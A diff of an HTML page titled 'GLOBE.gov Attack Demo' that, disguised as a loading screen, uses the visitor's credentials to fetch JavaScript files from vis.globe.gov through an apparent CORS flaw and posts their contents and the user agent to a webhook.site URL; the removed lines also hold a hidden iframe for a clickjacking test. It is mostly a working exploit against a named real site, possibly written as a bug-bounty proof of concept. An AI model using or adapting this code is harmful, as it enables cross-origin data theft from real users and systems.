@@ -1,47 +1,46 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>GLOBE.gov Attack Demo</title>
-</head>
+<html>
 <body>
 <h2>Loading... Please wait</h2>
+<pre id="log"></pre>
 
 <script>
+function log(msg) {
+  document.getElementById("log").textContent += msg + "\n";
+  console.log(msg);
+}
+
 (async () => {
   try {
-    // Step 1: Exploit CORS to access sensitive JS files from vis.globe.gov
-    const res1 = await fetch("https://vis.globe.gov/GLOBE/javascript/VISmain.js", {
+    const js1 = await fetch("https://vis.globe.gov/GLOBE/javascript/VISmain.js", {
       credentials: "include"
     });
-    const res2 = await fetch("https://vis.globe.gov/GLOBE/javascript/purify.min.js", {
+    log("JS1 Status: " + js1.status);
+    const data1 = await js1.text();
+
+    const js2 = await fetch("https://vis.globe.gov/GLOBE/javascript/purify.min.js", {
       credentials: "include"
     });
+    log("JS2 Status: " + js2.status);
+    const data2 = await js2.text();
 
-    const data1 = await res1.text();
-    const data2 = await res2.text();
-
-    // Step 2: Exfiltrate content to attacker's Webhook
-    await fetch("https://webhook.site/29f5b779-2540-4657-a365-bc504ee5c1de", {
+    log("Fetched both JS files, sending to webhook...");
+    const send = await fetch("https://webhook.site/29f5b779-2540-4657-a365-bc504ee5c1de", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
-        status: "💉 Data stolen from vis.globe.gov via CORS",
-        VISmain: data1.slice(0, 1000),
-        purify: data2.slice(0, 1000),
+        file1: data1.slice(0, 200),
+        file2: data2.slice(0, 200),
         userAgent: navigator.userAgent,
-        origin: location.origin,
-        timestamp: new Date().toISOString()
+        ts: new Date().toISOString()
       })
     });
+
+    log("Webhook POST status: " + send.status);
   } catch (err) {
-    console.error("Attack failed:", err);
+    log("Error: " + err.message);
   }
 })();
 </script>
-
-<!-- Optional: test iframe injection due to missing X-Frame-Options -->
-<iframe src="https://vis.globe.gov/GLOBE/popUpContents.jsp" width="1" height="1" style="opacity:0;pointer-events:none"></iframe>
-
 </body>
 </html>
